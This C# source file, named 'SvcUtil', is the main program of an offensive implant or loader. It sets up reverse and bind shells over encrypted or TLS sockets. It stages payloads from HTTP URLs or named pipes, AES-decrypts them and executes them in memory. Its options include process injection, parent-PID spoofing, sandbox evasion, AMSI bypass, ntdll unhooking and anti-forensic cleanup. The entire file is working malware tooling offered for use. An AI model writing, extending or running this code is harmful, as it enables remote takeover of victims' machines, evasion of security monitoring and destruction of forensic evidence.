using System;
#if INJECT
using System.Diagnostics;
#endif
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace SvcUtil
{
    internal class Program
    {
        private static string _host;
        private static int _port;
        private static string _command;
        private static byte[] _key;
        private static bool _listenMode;
        private static bool _reconnect;
        private static bool _noEncrypt;
        private static bool _useTls;
        private static string _payloadB64;
        private static string _stageUrl;
        private static string _stagePipe;
        private static string _aesPassword;
#if INJECT
        private static int _targetPid;
        private static bool _useThreadInject;
        private static int _ppidSpoof;
#endif
        private static bool _noSandbox;
        private static bool _amsi;
        private static bool _unhookNtdll;
        private static bool _execAsm;
        private static string[] _asmArgs;
        private static bool _cleanup;

        static void Main(string[] args)
        {
            // Set defaults
            _host = Config.DefaultIp;
            _port = Config.DefaultPort;
            _command = Config.DefaultCommand;
            _key = Config.DefaultTrafficKey;
            _listenMode = false;
            _reconnect = false;
            _noEncrypt = false;
            _useTls = false;
            _payloadB64 = null;
            _stageUrl = null;
            _stagePipe = null;
            _aesPassword = null;
#if INJECT
            _targetPid = 0;
            _useThreadInject = false;
            _ppidSpoof = 0;
#endif
            _noSandbox = false;
            _amsi = false;
            _unhookNtdll = false;
            _execAsm = false;
            _asmArgs = new string[0];
            _cleanup = false;

            if (!ParseArgs(args))
                return;

#if INJECT
            // --thread-inject only makes sense with a remote target
            if (_useThreadInject && _targetPid == 0 && _ppidSpoof == 0)
                return;
#endif

            // --exec-asm requires a payload source
            if (_execAsm && _payloadB64 == null &&
                _stageUrl == null && _stagePipe == null)
                return;

            // Resolve payload from any source
            byte[] payload = null;

            if (_payloadB64 != null)
            {
                try { payload = Convert.FromBase64String(_payloadB64); }
                catch { return; }
            }
            else if (_stageUrl != null)
            {
                payload = Stager.FromHttp(_stageUrl);
                if (payload == null) return;
            }
            else if (_stagePipe != null)
            {
                payload = Stager.FromPipe(_stagePipe);
                if (payload == null) return;
            }

            if (payload != null)
            {
                if (!_noSandbox && !Env.Go())
                    return;

                // AES decryption if password provided
                if (_aesPassword != null)
                {
                    try
                    {
                        payload = AesCrypto.Decrypt(payload, _aesPassword);
                    }
                    catch
                    {
                        return;
                    }
                }

                try
                {
                    if (_execAsm)
                    {
                        AsmExec.Run(payload, _asmArgs);
                    }
#if INJECT
                    else if (_targetPid > 0)
                    {
                        bool injected;
                        if (_useThreadInject)
                            injected = ThreadInjector.Inject(_targetPid, payload);
                        else
                            injected = RemoteLoader.Inject(_targetPid, payload);

                        if (!injected)
                            return;
                    }
                    else if (_ppidSpoof > 0)
                    {
                        IntPtr hProc, hThread;
                        int childPid;
                        if (!PpidSpoof.CreateWithParent(
                                _command, _ppidSpoof, true,
                                out hProc, out hThread, out childPid))
                            return;

                        bool injected = _useThreadInject
                            ? ThreadInjector.Inject(childPid, payload)
                            : RemoteLoader.Inject(childPid, payload);

                        if (!injected)
                            return;

                        Syscall.NtResumeThread(hThread);
                        Syscall.NtClose(hThread);
                        Syscall.NtClose(hProc);
                    }
                    else
                    {
                        PayloadRunner.Execute(payload);
                    }
#endif
                }
                finally
                {
                    Array.Clear(payload, 0, payload.Length);
                }

                // Post-payload anti-forensic cleanup
                if (_cleanup)
                    DoCleanup();

                return;
            }

            // ── Shell mode ──────────────────────────────────────────────

            if (_listenMode)
                RunListenMode();
            else if (_reconnect)
                RunReverseWithReconnect();
            else
                RunReverse();

            // Post-session anti-forensic cleanup
            if (_cleanup)
                DoCleanup();
        }

        // ── Argument parsing ─────────────────────────────────────────

        private static bool ParseArgs(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLowerInvariant())
                {
                    case "-c":
                    case "--connect":
                        if (i + 2 >= args.Length) return false;
                        _host = args[++i];
                        if (!int.TryParse(args[++i], out _port)) return false;
                        break;

                    case "-l":
                    case "--listen":
                        _listenMode = true;
                        if (i + 1 >= args.Length) return false;
                        if (!int.TryParse(args[++i], out _port)) return false;
                        break;

                    case "-e":
                    case "--exec":
                        if (i + 1 >= args.Length) return false;
                        _command = args[++i];
                        break;

                    case "-k":
                    case "--key":
                        if (i + 1 >= args.Length) return false;
                        _key = Encoding.UTF8.GetBytes(args[++i]);
                        break;

                    case "-r":
                    case "--reconnect":
                        _reconnect = true;
                        break;

                    case "-n":
                    case "--no-encrypt":
                        _noEncrypt = true;
                        break;

                    case "-a":
                    case "--amsi":
                        _amsi = true;
                        break;

                    case "--tls":
                        _useTls = true;
                        break;

                    case "-s":
                    case "--payload":
                        if (i + 1 >= args.Length) return false;
                        string sArg = args[++i];
                        if (File.Exists(sArg))
                            _payloadB64 = File.ReadAllText(sArg).Trim();
                        else
                            _payloadB64 = sArg;
                        break;

                    case "--stage-http":
                        if (i + 1 >= args.Length) return false;
                        _stageUrl = args[++i];
                        break;

                    case "--stage-pipe":
                        if (i + 1 >= args.Length) return false;
                        _stagePipe = args[++i];
                        break;

                    case "-p":
                    case "--password":
                        if (i + 1 >= args.Length) return false;
                        _aesPassword = args[++i];
                        break;

#if INJECT
                    case "-i":
                    case "--inject":
                        if (i + 1 >= args.Length) return false;
                        string iArg = args[++i];
                        if (!int.TryParse(iArg, out _targetPid))
                        {
                            string iName = iArg;
                            if (iName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                                iName = iName.Substring(0, iName.Length - 4);

                            var procs = Process.GetProcessesByName(iName);
                            if (procs.Length > 0)
                                _targetPid = procs[0].Id;
                            else
                                return false;
                        }
                        break;

                    case "--thread-inject":
                        _useThreadInject = true;
                        break;

                    case "--ppid":
                        if (i + 1 >= args.Length) return false;
                        string ppArg = args[++i];
                        if (!int.TryParse(ppArg, out _ppidSpoof))
                        {
                            string ppName = ppArg;
                            if (ppName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                                ppName = ppName.Substring(0, ppName.Length - 4);

                            _ppidSpoof = PpidSpoof.FindParentPid(ppName);
                            if (_ppidSpoof == 0)
                                return false;
                        }
                        break;
#endif

                    case "--exec-asm":
                        _execAsm = true;
                        break;

                    case "--":
                        var remaining = new System.Collections.Generic.List<string>();
                        for (int j = i + 1; j < args.Length; j++)
                            remaining.Add(args[j]);
                        _asmArgs = remaining.ToArray();
                        return true;

                    case "--unhook":
                        _unhookNtdll = true;
                        break;

                    case "--no-sandbox":
                        _noSandbox = true;
                        break;

                    case "--cleanup":
                        _cleanup = true;
                        break;

                    default:
                        if (i == 0 && !args[0].StartsWith("-"))
                        {
                            _host = args[0];
                            if (args.Length >= 2 && int.TryParse(args[1], out _port))
                            {
                                if (args.Length >= 3)
                                    _command = args[2];
                                return true;
                            }
                            return false;
                        }
                        return false;
                }
            }
            return true;
        }

        // ── Anti-forensic cleanup ────────────────────────────────────

        private static void DoCleanup()
        {
            try
            {
                // Resolve selfPath — null when running in-memory
                string selfPath = null;
                try
                {
                    var entry = System.Reflection.Assembly.GetEntryAssembly();
                    if (entry != null && !string.IsNullOrEmpty(entry.Location))
                        selfPath = entry.Location;
                }
                catch { }

                // Check elevation
                bool isElevated = false;
                try
                {
                    var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
                    isElevated = principal.IsInRole(
                        System.Security.Principal.WindowsBuiltInRole.Administrator);
                }
                catch { }

                Cleanup.Run(selfPath, isElevated);
            }
            catch { }
        }

        // ── Execution modes ──────────────────────────────────────────

        private static void RunReverse()
        {
            Socket sock = Connection.ConnectReverse(_host, _port);
            if (sock == null) return;

            IShellStream stream = CreateStream(sock);
            if (stream == null) return;

            Shell.Execute(_command, stream, _amsi, _unhookNtdll);
        }

        private static void RunReverseWithReconnect()
        {
            while (true)
            {
                Socket sock = Connection.ConnectWithRetry(_host, _port,
                    Config.MaxReconnectAttempts);
                if (sock == null) return;

                IShellStream stream = CreateStream(sock);
                if (stream == null) return;

                Shell.Execute(_command, stream, _amsi, _unhookNtdll);
            }
        }

        private static void RunListenMode()
        {
            Socket sock = Connection.Listen(_port);
            if (sock == null) return;

            IShellStream stream = CreateStream(sock);
            if (stream == null) return;

            Shell.Execute(_command, stream, _amsi, _unhookNtdll);
        }

        private static IShellStream CreateStream(Socket sock)
        {
            if (_useTls)
            {
                var tls = new TlsStream(sock);
                if (!tls.Authenticate(_host))
                {
                    tls.Close();
                    return null;
                }
                return tls;
            }

            byte[] key = _noEncrypt
                ? new byte[] { 0x00 }
                : _key;
            return new CryptoStream(sock, key);
        }
    }
}
